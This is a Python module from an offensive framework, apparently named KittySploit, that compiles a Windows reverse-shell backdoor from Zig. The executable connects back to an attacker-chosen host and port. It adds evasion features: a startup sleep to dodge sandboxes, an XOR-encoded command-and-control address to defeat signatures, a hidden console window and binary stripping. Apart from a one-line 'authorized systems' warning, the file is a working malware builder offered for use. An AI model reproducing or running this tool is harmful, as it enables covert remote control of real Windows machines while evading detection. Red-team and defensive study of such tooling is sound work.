#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Pure Zig Windows reverse shell with evasion options.

Compiles a GUI-subsystem reverse shell (no embedded shellcode) with optional
startup sleep and XOR-encoded C2 host string to reduce static signatures.
"""

from pathlib import Path

from kittysploit import *
from lib.compile.backdoor_helpers import option_value, prepare_exe_output
from lib.compile.exe import ExeCompiler
from lib.compile.zig_shell import build_zig_shell_source


class Module(Backdoor):
    __info__ = {
        "name": "Zig Shell Evasion",
        "description": (
            "Generate a Windows x64 reverse shell compiled from pure Zig (no shellcode). "
            "Supports GUI subsystem, startup sleep delay, and XOR-encoded LHOST string."
        ),
        "author": "KittySploit",
        "platform": Platform.WINDOWS,
        "arch": Arch.X64,
        "session_type": SessionType.SHELL,
        "listener": "listeners/multi/reverse_tcp",
        "references": [
            "https://ziglang.org/",
        ],
    }

    lhost = OptString("127.0.0.1", "Connect-back IP address", True)
    lport = OptPort(4444, "Connect-back TCP port", True)
    sleep = OptInteger(10000, "Sleep milliseconds before connecting (sandbox evasion)", False)
    obfuscate_host = OptBool(True, "XOR-encode LHOST at compile time", False)
    target_arch = OptChoice("x64", "Target architecture", True, ["x64", "x86"])
    output_name = OptString("zig_shell_evasion.exe", "Output executable filename", False)
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    save_source = OptBool(False, "Save generated Zig source alongside the EXE", False, advanced=True)
    windows_subsystem = OptChoice(
        "windows",
        "PE subsystem (windows hides console)",
        False,
        ["windows", "console"],
    )

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        arch = str(option_value(self, "target_arch") or "x64")
        zig_arch = "x86_64" if arch in ("x64", "x86_64") else "x86"

        source = build_zig_shell_source(
            lhost=str(option_value(self, "lhost") or "127.0.0.1"),
            lport=int(option_value(self, "lport") or 4444),
            sleep_ms=int(option_value(self, "sleep") or 0),
            obfuscate_host=bool(option_value(self, "obfuscate_host")),
        )

        out_dir, exe_name = prepare_exe_output(
            self,
            "backdoors/windows/evasion",
            str(option_value(self, "output_name") or "zig_shell_evasion.exe"),
        )
        exe_path = out_dir / exe_name

        if option_value(self, "save_source"):
            src_path = out_dir / "zig_shell_evasion.zig"
            src_path.write_text(source, encoding="utf-8")
            print_success(f"Zig source saved: {src_path}")

        compiler = ExeCompiler(framework=getattr(self, "framework", None))
        zig = compiler._get_zig_compiler()
        if not zig.is_available():
            print_error("Zig compiler not available; cannot generate PE.")
            return False

        subsystem = str(option_value(self, "windows_subsystem") or "windows")
        ok = zig.compile(
            source_code=source,
            output_path=str(exe_path.resolve()),
            target_platform="windows",
            target_arch=zig_arch,
            optimization=str(option_value(self, "optimization") or "ReleaseSmall"),
            strip=True,
            static=True,
            windows_subsystem=subsystem if subsystem != "console" else None,
        )

        if ok and exe_path.is_file():
            size = exe_path.stat().st_size
            print_success(f"Backdoor executable generated: {exe_path} ({size} bytes)")
            print_info(
                f"Connect: {option_value(self, 'lhost')}:{option_value(self, 'lport')} | "
                f"Sleep: {option_value(self, 'sleep')} ms | "
                f"Host obfuscation: {option_value(self, 'obfuscate_host')}"
            )
            print_warning("Use only on authorized systems. Start a matching listener before running the EXE.")
            return True

        print_error("PE compilation failed. Ensure Zig is installed (core/lib/compiler/zig_executable or PATH).")
        return False
